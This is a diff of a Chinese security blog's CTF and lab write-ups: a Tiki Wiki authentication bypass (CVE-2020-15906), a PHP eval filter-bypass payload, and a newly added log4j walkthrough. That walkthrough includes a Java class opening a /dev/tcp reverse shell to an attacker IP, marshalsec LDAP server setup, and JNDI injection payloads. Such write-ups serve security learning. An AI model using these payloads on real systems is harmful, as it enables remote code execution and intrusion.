@@ -401,7 +401,7 @@
 <p>直接搜索该CMS的漏洞，发现当对应版本&lt;21.2时候，存在Tiki Wiki CMS Groupware 认证绕过漏洞（CVE-2020-15906）&#x3D;&#x3D;我怀疑msf是不是砍掉了好多CVE，，，search莫得这个，最近的只有17年的cve&#x3D;&#x3D;</p>
 <p>试了一下组合的CVE，不太彳亍嗷，这里就不放脚本了，然后我们根据github的链接一步步<a target="_blank" rel="noopener" href="https://github.com/S1lkys/CVE-2020-15906">复现</a>，其实很简单，就是多次爆破，然后回修改数据库中admin账号的密码，50次左右时候，将admin的密码删去提交表单即可成功以admin登录。</p>
 <p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116185621658.png" alt="image-20230116185621658"></p>
-<p>进来后，找到一个文件上传的点，测试了一下，不行，，，，，先赶紧把admin的密码改了，修改为<code>ZW2000117ZW</code>作为后续使用</p>
+<p>进来后，找到一个文件上传的点，测试了一下，不行，，，，，先赶紧把admin的密码改了，修改为<code>********</code>作为后续使用</p>
 <p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116193759288.png" alt="image-20230116193759288"></p>
 <p>继续收集信息，在wiki的list page中，有个用户silly的homepage和一个奇怪的页面</p>
 <p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116194624292.png" alt="image-20230116194624292"></p>
@@ -886,7 +886,7 @@
 <h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 
 <p>过滤更多了，括号和<code>echo</code>还有分号都给过滤了，考虑如下进行绕过括号</p>
-<p><img src="D:\Myblog\source\images\CTF-web-2.assets\1999159-20201002223158950-1419102854.png" alt="img"></p>
+<p><img src="/../images/CTF-web-2.assets/1999159-20201002223158950-1419102854.png" alt="img"></p>
 <p>同时注意，&#x3D;&#x3D;php代码的最后一句是可以不带分号的！&#x3D;&#x3D;</p>
 <p>且实际测试中发现对%09的过滤更加严格了，参考php语言，换用%0a（&#x3D;&#x3D;换行符&#x3D;&#x3D;）进行绕过空格</p>
 <h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
@@ -1324,6 +1324,31 @@
 <li>公网Ip反弹shell</li>
 <li>时间盲注跑脚本</li>
 </ul>
+<h2 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h2><p><img src="/../images/CTF-web-2.assets/image-20231124012127072.png" alt="image-20231124012127072"></p>
+<p>一个公开的靶场，打开页面，在输入框中存在log4j漏洞</p>
+<p><img src="/../images/CTF-web-2.assets/image-20231124012203635.png" alt="image-20231124012203635"></p>
+<p><img src="/../images/CTF-web-2.assets/image-20231124012253282.png" alt="image-20231124012253282"></p>
+<p>采用另一种弹shell方式，首先编写一段java代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 要执行的命令</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/your_ip/6666;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span> &#123;</span><br><span class="line">        <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>javac Exploit.java</code>编译，会在同目录下生成Exploit.class文件，将这俩上传至服务器，python开启80页面</p>
+<p><code>python -m http.server 80</code></p>
+<p><img src="/../images/CTF-web-2.assets/image-20231124013624698.png" alt="image-20231124013624698"></p>
+<p>服务器上启动<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://your-ip/#Exploit&quot;</code></p>
+<p><img src="/../images/CTF-web-2.assets/image-20231124013857845.png" alt="image-20231124013857845"></p>
+<p>再监听6666端口，<code>nc -lvnp 6666</code></p>
+<p>报错！</p>
+<p>首先，第一个小坑，<strong>云服务器需要防火墙放行一些端口和协议</strong></p>
+<p>其次，这里有个巨坑！麻了，<a target="_blank" rel="noopener" href="https://paper.seebug.org/942/">链接</a>，简单来说，<strong>高版本的jdk会对ldap进行限制！</strong>导致执行JNDIExploit会报错，这里卡了个极限，吧原来的jdk21改为了jdk8u181</p>
+<p><img src="/../images/CTF-web-2.assets/image-20231124023953349.png" alt="image-20231124023953349"></p>
+<p>修改完后使用正常的payload就会发现正常</p>
+<p><code>$&#123;jndi:ldap://vps的IP:1389/Basic/Command/whoami&#125;</code></p>
+<p><img src="/../images/CTF-web-2.assets/image-20231124024114946.png" alt="image-20231124024114946"></p>
+<p>现在尝试弹shell，<code>$&#123;jndi:ldap://vps的IP:1389/Basic/ReverseShell/vps的IP/6666&#125;</code></p>
+<p><img src="/../images/CTF-web-2.assets/image-20231124024526086.png" alt="image-20231124024526086"></p>
+<p><code>nc -lvnp 666</code>监听的结果如图</p>
+<p><img src="/../images/CTF-web-2.assets/image-20231124024631142.png" alt="image-20231124024631142"></p>
+<p>爽！完美解决！</p>
 
     
 
